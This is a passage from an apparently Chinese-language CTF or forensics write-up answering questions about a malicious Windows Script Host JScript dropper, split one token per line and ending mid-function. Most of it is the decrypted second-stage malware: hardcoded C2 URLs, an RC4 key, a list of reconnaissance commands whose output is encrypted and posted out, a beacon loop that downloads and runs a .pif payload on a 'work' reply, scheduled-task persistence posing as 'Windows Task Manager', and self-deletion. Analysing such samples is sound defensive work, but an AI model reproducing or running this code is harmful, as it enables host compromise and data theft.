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"
+;
+return
+qGxZ
+;
+}
+var
+wvy1
+=
+WScript
+.
+Arguments
+;
+var
+ssWZ
+=
+wvy1
+(
+0
+)
+;
+wvy1
+：接住了
+命令行参数集合
+ssWZ
+：从这个集合里取出了
+第一个实际参数值
+答案：wvy1
+44.接上题，哪个函数返回下一阶段代码（即第一轮混淆代码）？【答案格式：abc3】
+看
+maintools.js
+入口：
+var
+wvy1
+=
+WScript
+.
+Arguments
+;
+var
+ssWZ
+=
+wvy1
+(
+0
+)
+;
+var
+ES3c
+=
+y3zb
+(
+)
+;
+ES3c
+=
+LXv5
+(
+ES3c
+)
+;
+ES3c
+=
+CpPT
+(
+ssWZ
+,
+ES3c
+)
+;
+eval
+(
+ES3c
+)
+;
+按执行链拆：
+y3zb()
+:先返回一大串字符串，也就是
+第一轮混淆代码
+（准确说是后续要处理的加密/编码数据源）
+LXv5(ES3c)
+:把这串字符串做一层解码
+CpPT(ssWZ, ES3c)
+:再用上一题的密钥做解密，得到真正下一阶段代码
+eval(ES3c)
+:执行解密后的代码
+答案：y3zb
+45.接上题，可以使用哪个 Windows 脚本主机程序在
+**命令行模式**
+下执行该脚本？【答案格式：wscript.exe】
+Windows Script Host （WSH）常见两个宿主：
+**wscript.exe**
+：偏****窗口模式
+**cscript.exe**
+：偏****命令行/控制台模式
+cscript.exe【送分】
+46.接上题，请提取出所有硬编码的C2(Command & Control）服务器域名？【答案格式：www.baidu.com、www.google.com，按照在代码中出现的顺序排序】
+密钥：
+EzZETcSXyKAdF_e5I2i1
+y3zb()
+取出第一轮混淆字符串
+LXv5()
+做 Base64 风格解码
+CpPT()
+用密钥
+EzZETcSXyKAdF_e5I2i1
+做 RC4 解密
+解出下一阶段 JS 后，直接搜
+http://
+厨子一下
+www.saipadiesel124.com、www.folk-cantabria.com
+47.接上题，当C2服务器返回 “work” 指令时，脚本下载并执行的最终文件扩展名是什么？【答案格式：exe】
+// 读取文件并进行字符编码转换
+function
+UspD
+(
+zDmy
+)
+{
+var
+m3mH
+=
+WScript
+.
+CreateObject
+(
+"ADODB.Stream"
+)
+;
+m3mH
+.
+Type
+=
+2
+;
+m3mH
+.
+CharSet
+=
+'437'
+;
+m3mH
+.
+Open
+(
+)
+;
+m3mH
+.
+LoadFromFile
+(
+zDmy
+)
+;
+var
+c0xi
+=
+m3mH
+.
+ReadText
+;
+m3mH
+.
+Close
+(
+)
+;
+return
+cz_b
+(
+c0xi
+)
+;
+}
+// 恶意 C2 服务器地址列表
+var
+CKpR
+=
+new
+Array
+(
+"http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php"
+,
+"http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php"
+)
+;
+// 加密密钥
+var
+tpO8
+=
+"w3LxnRSbJcqf8HrU"
+;
+// 系统信息收集命令（窃取主机数据）
+var
+auME
+=
+new
+Array
+(
+"systeminfo > "
+,
+"net view >> "
+,
+"net view /domain >> "
+,
+"tasklist /v >> "
+,
+"gpresult /z >> "
+,
+"netstat -nao >> "
+,
+"ipconfig /all >> "
+,
+"arp -a >> "
+,
+"net share >> "
+,
+"net use >> "
+,
+"net user >> "
+,
+"net user administrator >> "
+,
+"net user /domain >> "
+,
+"net user administrator /domain >> "
+,
+"set  >> "
+,
+"dir %systemdrive%\\Users\\*.* >> "
+,
+"dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> "
+,
+"dir %userprofile%\\Desktop\\*.* >> "
+,
+"tasklist /fi \"modules eq wow64.dll\"  >> "
+,
+"tasklist /fi \"modules ne wow64.dll\" >> "
+,
+"dir \"%programfiles(x86)%\" >> "
+,
+"dir \"%programfiles%\" >> "
+,
+"dir %appdata% >>"
+)
+;
+var
+QUjy
+=
+new
+ActiveXObject
+(
+"Scripting.FileSystemObject"
+)
+;
+var
+LIxF
+=
+WScript
+.
+ScriptName
+;
+var
+w5mY
+=
+""
+;
+var
+ruGx
+=
+TfOh
+(
+)
+;
+// Base64 编码
+function
+hLit
+(
+XngP
+,
+y1qa
+)
+{
+char_set
+=
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+;
+var
+Rj3c
+=
+""
+;
+var
+OKpB
+=
+""
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+XngP
+.
+length
+;
+++
+i
+)
+{
+var
+B8wU
+=
+XngP
+.
+charCodeAt
+(
+i
+)
+;
+var
+LUxg
+=
+B8wU
+.
+toString
+(
+2
+)
+;
+while
+(
+LUxg
+.
+length
+<
+(
+y1qa
+?
+8
+:
+16
+)
+)
+LUxg
+=
+"0"
++
+LUxg
+;
+OKpB
++=
+LUxg
+;
+while
+(
+OKpB
+.
+length
+>=
+6
+)
+{
+var
+vjUu
+=
+OKpB
+.
+slice
+(
+0
+,
+6
+)
+;
+OKpB
+=
+OKpB
+.
+slice
+(
+6
+)
+;
+Rj3c
++=
+this
+.
+char_set
+.
+charAt
+(
+parseInt
+(
+vjUu
+,
+2
+)
+)
+;
+}
+}
+if
+(
+OKpB
+)
+{
+while
+(
+OKpB
+.
+length
+<
+6
+)
+OKpB
++=
+"0"
+;
+Rj3c
++=
+this
+.
+char_set
+.
+charAt
+(
+parseInt
+(
+OKpB
+,
+2
+)
+)
+;
+}
+while
+(
+Rj3c
+.
+length
+%
+(
+y1qa
+?
+4
+:
+8
+)
+!=
+0
+)
+Rj3c
++=
+"="
+;
+return
+Rj3c
+;
+}
+// 字符编码映射表
+var
+b92A
+=
+[
+]
+;
+b92A
+[
+'C7'
+]
+=
+'80'
+;
+b92A
+[
+'FC'
+]
+=
+'81'
+;
+b92A
+[
+'E9'
+]
+=
+'82'
+;
+b92A
+[
+'E2'
+]
+=
+'83'
+;
+b92A
+[
+'E4'
+]
+=
+'84'
+;
+b92A
+[
+'E0'
+]
+=
+'85'
+;
+b92A
+[
+'E5'
+]
+=
+'86'
+;
+b92A
+[
+'E7'
+]
+=
+'87'
+;
+b92A
+[
+'EA'
+]
+=
+'88'
+;
+b92A
+[
+'EB'
+]
+=
+'89'
+;
+b92A
+[
+'E8'
+]
+=
+'8A'
+;
+b92A
+[
+'EF'
+]
+=
+'8B'
+;
+b92A
+[
+'EE'
+]
+=
+'8C'
+;
+b92A
+[
+'EC'
+]
+=
+'8D'
+;
+b92A
+[
+'C4'
+]
+=
+'8E'
+;
+b92A
+[
+'C5'
+]
+=
+'8F'
+;
+b92A
+[
+'C9'
+]
+=
+'90'
+;
+b92A
+[
+'E6'
+]
+=
+'91'
+;
+b92A
+[
+'C6'
+]
+=
+'92'
+;
+b92A
+[
+'F4'
+]
+=
+'93'
+;
+b92A
+[
+'F6'
+]
+=
+'94'
+;
+b92A
+[
+'F2'
+]
+=
+'95'
+;
+b92A
+[
+'FB'
+]
+=
+'96'
+;
+b92A
+[
+'F9'
+]
+=
+'97'
+;
+b92A
+[
+'FF'
+]
+=
+'98'
+;
+b92A
+[
+'D6'
+]
+=
+'99'
+;
+b92A
+[
+'DC'
+]
+=
+'9A'
+;
+b92A
+[
+'A2'
+]
+=
+'9B'
+;
+b92A
+[
+'A3'
+]
+=
+'9C'
+;
+b92A
+[
+'A5'
+]
+=
+'9D'
+;
+b92A
+[
+'20A7'
+]
+=
+'9E'
+;
+b92A
+[
+'192'
+]
+=
+'9F'
+;
+b92A
+[
+'E1'
+]
+=
+'A0'
+;
+b92A
+[
+'ED'
+]
+=
+'A1'
+;
+b92A
+[
+'F3'
+]
+=
+'A2'
+;
+b92A
+[
+'FA'
+]
+=
+'A3'
+;
+b92A
+[
+'F1'
+]
+=
+'A4'
+;
+b92A
+[
+'D1'
+]
+=
+'A5'
+;
+b92A
+[
+'AA'
+]
+=
+'A6'
+;
+b92A
+[
+'BA'
+]
+=
+'A7'
+;
+b92A
+[
+'BF'
+]
+=
+'A8'
+;
+b92A
+[
+'2310'
+]
+=
+'A9'
+;
+b92A
+[
+'AC'
+]
+=
+'AA'
+;
+b92A
+[
+'BD'
+]
+=
+'AB'
+;
+b92A
+[
+'BC'
+]
+=
+'AC'
+;
+b92A
+[
+'A1'
+]
+=
+'AD'
+;
+b92A
+[
+'AB'
+]
+=
+'AE'
+;
+b92A
+[
+'BB'
+]
+=
+'AF'
+;
+b92A
+[
+'2591'
+]
+=
+'B0'
+;
+b92A
+[
+'2592'
+]
+=
+'B1'
+;
+b92A
+[
+'2593'
+]
+=
+'B2'
+;
+b92A
+[
+'2502'
+]
+=
+'B3'
+;
+b92A
+[
+'2524'
+]
+=
+'B4'
+;
+b92A
+[
+'2561'
+]
+=
+'B5'
+;
+b92A
+[
+'2562'
+]
+=
+'B6'
+;
+b92A
+[
+'2556'
+]
+=
+'B7'
+;
+b92A
+[
+'2555'
+]
+=
+'B8'
+;
+b92A
+[
+'2563'
+]
+=
+'B9'
+;
+b92A
+[
+'2551'
+]
+=
+'BA'
+;
+b92A
+[
+'2557'
+]
+=
+'BB'
+;
+b92A
+[
+'255D'
+]
+=
+'BC'
+;
+b92A
+[
+'255C'
+]
+=
+'BD'
+;
+b92A
+[
+'255B'
+]
+=
+'BE'
+;
+b92A
+[
+'2510'
+]
+=
+'BF'
+;
+b92A
+[
+'2514'
+]
+=
+'C0'
+;
+b92A
+[
+'2534'
+]
+=
+'C1'
+;
+b92A
+[
+'252C'
+]
+=
+'C2'
+;
+b92A
+[
+'251C'
+]
+=
+'C3'
+;
+b92A
+[
+'2500'
+]
+=
+'C4'
+;
+b92A
+[
+'253C'
+]
+=
+'C5'
+;
+b92A
+[
+'255E'
+]
+=
+'C6'
+;
+b92A
+[
+'255F'
+]
+=
+'C7'
+;
+b92A
+[
+'255A'
+]
+=
+'C8'
+;
+b92A
+[
+'2554'
+]
+=
+'C9'
+;
+b92A
+[
+'2569'
+]
+=
+'CA'
+;
+b92A
+[
+'2566'
+]
+=
+'CB'
+;
+b92A
+[
+'2560'
+]
+=
+'CC'
+;
+b92A
+[
+'2550'
+]
+=
+'CD'
+;
+b92A
+[
+'256C'
+]
+=
+'CE'
+;
+b92A
+[
+'2567'
+]
+=
+'CF'
+;
+b92A
+[
+'2568'
+]
+=
+'D0'
+;
+b92A
+[
+'2564'
+]
+=
+'D1'
+;
+b92A
+[
+'2565'
+]
+=
+'D2'
+;
+b92A
+[
+'2559'
+]
+=
+'D3'
+;
+b92A
+[
+'2558'
+]
+=
+'D4'
+;
+b92A
+[
+'2552'
+]
+=
+'D5'
+;
+b92A
+[
+'2553'
+]
+=
+'D6'
+;
+b92A
+[
+'256B'
+]
+=
+'D7'
+;
+b92A
+[
+'256A'
+]
+=
+'D8'
+;
+b92A
+[
+'2518'
+]
+=
+'D9'
+;
+b92A
+[
+'250C'
+]
+=
+'DA'
+;
+b92A
+[
+'2588'
+]
+=
+'DB'
+;
+b92A
+[
+'2584'
+]
+=
+'DC'
+;
+b92A
+[
+'258C'
+]
+=
+'DD'
+;
+b92A
+[
+'2590'
+]
+=
+'DE'
+;
+b92A
+[
+'2580'
+]
+=
+'DF'
+;
+b92A
+[
+'3B1'
+]
+=
+'E0'
+;
+b92A
+[
+'DF'
+]
+=
+'E1'
+;
+b92A
+[
+'393'
+]
+=
+'E2'
+;
+b92A
+[
+'3C0'
+]
+=
+'E3'
+;
+b92A
+[
+'3A3'
+]
+=
+'E4'
+;
+b92A
+[
+'3C3'
+]
+=
+'E5'
+;
+b92A
+[
+'B5'
+]
+=
+'E6'
+;
+b92A
+[
+'3C4'
+]
+=
+'E7'
+;
+b92A
+[
+'3A6'
+]
+=
+'E8'
+;
+b92A
+[
+'398'
+]
+=
+'E9'
+;
+b92A
+[
+'3A9'
+]
+=
+'EA'
+;
+b92A
+[
+'3B4'
+]
+=
+'EB'
+;
+b92A
+[
+'221E'
+]
+=
+'EC'
+;
+b92A
+[
+'3C6'
+]
+=
+'ED'
+;
+b92A
+[
+'3B5'
+]
+=
+'EE'
+;
+b92A
+[
+'2229'
+]
+=
+'EF'
+;
+b92A
+[
+'2261'
+]
+=
+'F0'
+;
+b92A
+[
+'B1'
+]
+=
+'F1'
+;
+b92A
+[
+'2265'
+]
+=
+'F2'
+;
+b92A
+[
+'2264'
+]
+=
+'F3'
+;
+b92A
+[
+'2320'
+]
+=
+'F4'
+;
+b92A
+[
+'2321'
+]
+=
+'F5'
+;
+b92A
+[
+'F7'
+]
+=
+'F6'
+;
+b92A
+[
+'2248'
+]
+=
+'F7'
+;
+b92A
+[
+'B0'
+]
+=
+'F8'
+;
+b92A
+[
+'2219'
+]
+=
+'F9'
+;
+b92A
+[
+'B7'
+]
+=
+'FA'
+;
+b92A
+[
+'221A'
+]
+=
+'FB'
+;
+b92A
+[
+'207F'
+]
+=
+'FC'
+;
+b92A
+[
+'B2'
+]
+=
+'FD'
+;
+b92A
+[
+'25A0'
+]
+=
+'FE'
+;
+b92A
+[
+'A0'
+]
+=
+'FF'
+;
+// 生成随机字符串
+function
+TfOh
+(
+)
+{
+var
+ayuh
+=
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+10
++
+25
+)
+;
+var
+name
+=
+String
+.
+fromCharCode
+(
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+24
++
+65
+)
+)
+;
+var
+dc9V
+=
+WScript
+.
+CreateObject
+(
+"WScript.Network"
+)
+;
+w5mY
+=
+dc9V
+.
+UserName
+;
+for
+(
+var
+count
+=
+0
+;
+count
+<
+ayuh
+;
+count
+++
+)
+{
+switch
+(
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+3
+)
+)
+{
+case
+1
+:
+name
+=
+name
++
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+8
+)
+;
+break
+;
+case
+2
+:
+name
+=
+name
++
+String
+.
+fromCharCode
+(
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+24
++
+97
+)
+)
+;
+break
+;
+default
+:
+name
+=
+name
++
+String
+.
+fromCharCode
+(
+Math
+.
+ceil
+(
+Math
+.
+random
+(
+)
+*
+24
++
+65
+)
+)
+;
+break
+;
+}
+}
+return
+name
+;
+}
+var
+wyKN
+=
+Blgx
+(
+bIdG
+(
+)
+)
+;
+try
+{
+var
+WE86
+=
+bIdG
+(
+)
+;
+rGcR
+(
+)
+;
+jSm8
+(
+)
+;
+}
+catch
+(
+e
+)
+{
+WScript
+.
+Quit
+(
+)
+;
+}
+// 主循环：持续连接 C2 服务器
+function
+jSm8
+(
+)
+{
+var
+c9lr
+=
+Fv6b
+(
+)
+;
+while
+(
+true
+)
+{
+for
+(
+var
+i
+=
+0
+;
+i
+<
+CKpR
+.
+length
+;
+i
+++
+)
+{
+var
+Ysyo
+=
+CKpR
+[
+i
+]
+;
+var
+f3cb
+=
+XEWG
+(
+Ysyo
+,
+c9lr
+)
+;
+switch
+(
+f3cb
+)
+{
+case
+"good"
+:
+break
+;
+case
+"exit"
+:
+WScript
+.
+Quit
+(
+)
+;
+break
+;
+case
+"work"
+:
+XBL3
+(
+Ysyo
+)
+;
+break
+;
+case
+"fail"
+:
+tbMu
+(
+)
+;
+break
+;
+default
+:
+break
+;
+}
+TfOh
+(
+)
+;
+}
+// 休眠 3600~3900 秒后再次通信
+WScript
+.
+Sleep
+(
+(
+Math
+.
+random
+(
+)
+*
+300
++
+3600
+)
+*
+1000
+)
+;
+}
+}
+// 创建 WScript.Shell 对象
+function
+bIdG
+(
+)
+{
+var
+spq3
+=
+this
+[
+'ActiveXObject'
+]
+;
+var
+zBVv
+=
+new
+spq3
+(
+'WScript.Shell'
+)
+;
+return
+zBVv
+;
+}
+// 从 C2 下载并执行 payload
+function
+XBL3
+(
+B_TG
+)
+{
+var
+YIme
+=
+wyKN
++
+LIxF
+.
+substring
+(
+0
+,
+LIxF
+.
+length
+-
+2
+)
++
+"pif"
+;
+var
+Kpxo
+=
+new
+ActiveXObject
+(
+"MSXML2.XMLHTTP"
+)
+;
+Kpxo
+.
+OPEN
+(
+"post"
+,
+B_TG
+,
+false
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"user-agent:"
+,
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64); "
++
+Sz8k
+(
+)
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-type"
+,
+"application/octet-stream"
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-length:"
+,
+"4"
+)
+;
+Kpxo
+.
+SEND
+(
+"work"
+)
+;
+if
+(
+QUjy
+.
+FILEEXISTS
+(
+YIme
+)
+)
+{
+QUjy
+.
+DELETEFILE
+(
+YIme
+)
+;
+}
+if
+(
+Kpxo
+.
+STATUS
+==
+200
+)
+{
+var
+m3mH
+=
+new
+ActiveXObject
+(
+"ADODB.STREAM"
+)
+;
+m3mH
+.
+TYPE
+=
+1
+;
+m3mH
+.
+OPEN
+(
+)
+;
+m3mH
+.
+WRITE
+(
+Kpxo
+.
+responseBody
+)
+;
+m3mH
+.
+Position
+=
+0
+;
+m3mH
+.
+Type
+=
+2
+;
+m3mH
+.
+CharSet
+=
+"437"
+;
+var
+c0xi
+=
+m3mH
+.
+ReadText
+(
+m3mH
+.
+Size
+)
+;
+var
+ptF0
+=
+FXx9
+(
+"2f532d6baec3d0ec7b1f98aed4774843"
+,
+cz_b
+(
+c0xi
+)
+)
+;
+NoRS
+(
+ptF0
+,
+YIme
+)
+;
+m3mH
+.
+Close
+(
+)
+;
+}
+var
+ruGx
+=
+TfOh
+(
+)
+;
+c5ae
+(
+YIme
+,
+B_TG
+)
+;
+WScript
+.
+Sleep
+(
+30000
+)
+;
+QUjy
+.
+DELETEFILE
+(
+YIme
+)
+;
+}
+// 自删除
+function
+tbMu
+(
+)
+{
+QUjy
+.
+DELETEFILE
+(
+WScript
+.
+SCRIPTFULLNAME
+)
+;
+eV_C
+(
+"TaskManager"
+,
+"Windows Task Manager"
+,
+w5mY
+,
+v_FileName
+,
+"EzZETcSXyKAdF_e5I2i1"
+,
+wyKN
+,
+false
+)
+;
+KhDn
+(
+"TaskManager"
+)
+;
+WScript
+.
+Quit
+(
+)
+;
+}
+// 与 C2 通信
+function
+XEWG
+(
+uXHK
+,
+hm2j
+)
+{
+try
+{
+var
+Kpxo
+=
+new
+ActiveXObject
+(
+"MSXML2.XMLHTTP"
+)
+;
+Kpxo
+.
+OPEN
+(
+"post"
+,
+uXHK
+,
+false
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"user-agent:"
+,
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64); "
++
+Sz8k
+(
+)
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-type"
+,
+"application/octet-stream"
+)
+;
+var
+rRi3
+=
+hLit
+(
+hm2j
+,
+true
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-length:"
+,
+rRi3
+.
+length
+)
+;
+Kpxo
+.
+SEND
+(
+rRi3
+)
+;
+return
+Kpxo
+.
+responseText
+;
+}
+catch
+(
+e
+)
+{
+return
+""
+;
+}
+}
+// 生成唯一标识
+function
+Sz8k
+(
+)
+{
+var
+n9mV
+=
+""
+;
+var
+dc9V
+=
+WScript
+.
+CreateObject
+(
+"WScript.Network"
+)
+;
+var
+rRi3
+=
+tpO8
++
+dc9V
+.
+ComputerName
++
+w5mY
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+16
+;
+i
+++
+)
+{
+var
+YsXA
+=
+0
+for
+(
+var
+j
+=
+i
+;
+j
+<
+rRi3
+.
+length
+-
+1
+;
+j
+++
+)
+{
+YsXA
+=
+YsXA
+^
+rRi3
+.
+charCodeAt
+(
+j
+)
+;
+}
+YsXA
+=
+(
+YsXA
+%
+10
+)
+;
+n9mV
+=
+n9mV
++
+YsXA
+.
+toString
+(
+10
+)
+;
+}
+n9mV
+=
+n9mV
++
+tpO8
+;
+return
+n9mV
+;
+}
+// 持久化：创建计划任务
+function
+rGcR
+(
+)
+{
+v_FileName
+=
+wyKN
++
+LIxF
+.
+substring
+(
+0
+,
+LIxF
+.
+length
+-
+2
+)
++
+"js"
+;
+QUjy
+.
+COPYFILE
+(
+WScript
+.
+ScriptFullName
+,
+wyKN
++
+LIxF
+)
+;
+var
+HFp7
+=
+(
+Math
+.
+random
+(
+)
+*
+150
++
+350
+)
+*
+1000
+;
+WScript
+.
+Sleep
+(
+HFp7
+)
+;
+eV_C
+(
+"TaskManager"
+,
+"Windows Task Manager"
+,
+w5mY
+,
+v_FileName
+,
+"EzZETcSXyKAdF_e5I2i1"
+,
+wyKN
+,
+true
+)
+;
+}
+// 收集系统信息并加密
+function
+Fv6b
+(
+)
+{
+var
+m_Rr
+=
+wyKN
++
+"~dat.tmp"
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+auME
+.
+length
+;
+i
+++
+)
+{
+WE86
+.
+Run
+(
+"cmd.exe /c "
++
+auME
+[
+i
+]
++
+"\""
++
+m_Rr
++
+"\""
+,
+0
+,
+true
+)
+;
+}
+var
+nRVN
+=
+UspD
+(
+m_Rr
+)
+;
+WScript
+.
+Sleep
+(
+1000
+)
+;
+QUjy
+.
+DELETEFILE
+(
+m_Rr
+)
+;
+return
+FXx9
+(
+"2f532d6baec3d0ec7b1f98aed4774843"
+,
+nRVN
+)
+;
+}
+// 执行下载的文件
+function
+c5ae
+(
+YIme
+,
+B_TG
+)
+{
+try
+{
+if
+(
+QUjy
+.
+FILEEXISTS
+(
+YIme
+)
+)
+{
+WE86
+.
+Run
+(
+"\""
++
+YIme
++
+"\""
+)
+;
+}
+}
+catch
+(
+e
+)
+{
+var
+Kpxo
+=
+new
+ActiveXObject
+(
+"MSXML2.XMLHTTP"
+)
+;
+Kpxo
+.
+OPEN
+(
+"post"
+,
+B_TG
+,
+false
+)
+;
+var
+ePMy
+=
+"error"
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"user-agent:"
+,
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64); "
++
+Sz8k
+(
+)
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-type:"
+,
+"application/octet-stream"
+)
+;
+Kpxo
+.
+SETREQUESTHEADER
+(
+"content-length:"
+,
+ePMy
+.
+length
+)
+;
+Kpxo
+.
+SEND
+(
+ePMy
+)
+;
+return
+""
+;
+}
+}
+// 字节转十六进制
+function
+RPbY
+(
+r_X5
+)
+{
+var
+w8rG
+=
+"0123456789ABCDEF"
+;
+var
+yjrw
+=
+w8rG
+.
+substr
+(
+r_X5
+&
+15
+,
+1
+)
+;
+while
+(
+r_X5
+>
+15
+)
+{
+r_X5
+>>>=
+4
+;
+yjrw
+=
+w8rG
+.
+substr
+(
+r_X5
+&
+15
+,
+1
+)
++
+yjrw
+;
+}
+return
+yjrw
+;
+}
+// 十六进制转数字
+function
+NptO
